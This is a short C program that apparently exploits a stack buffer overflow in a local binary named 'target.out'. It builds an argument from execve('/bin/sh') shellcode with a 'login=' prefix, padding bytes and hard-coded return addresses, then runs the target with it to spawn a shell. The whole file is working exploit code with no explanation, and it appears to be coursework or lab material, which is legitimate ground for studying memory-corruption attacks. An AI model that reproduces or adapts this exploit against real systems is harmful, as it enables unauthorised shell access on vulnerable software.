#include <string.h>
#include <stdio.h>

static char shellcode[] = ""
"login=\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";//45

void main() {
	char* buffer;
	int i;

	buffer = malloc(781);

	strcpy(buffer, shellcode);
	for (i = 51; i < 772; i++) {
		buffer[i] = '\x42';
	}
	buffer[772] = '\x40';
	buffer[773] = '\xf8';
	buffer[774] = '\xff';
	buffer[775] = '\xbf';

	buffer[776] = '\x4a';
	buffer[777] = '\xf2';
	buffer[778] = '\xff';
	buffer[779] = '\xbf';

	buffer[780] = '\x00';

	execl("target.out", "target.out", buffer, (char*) NULL);
}
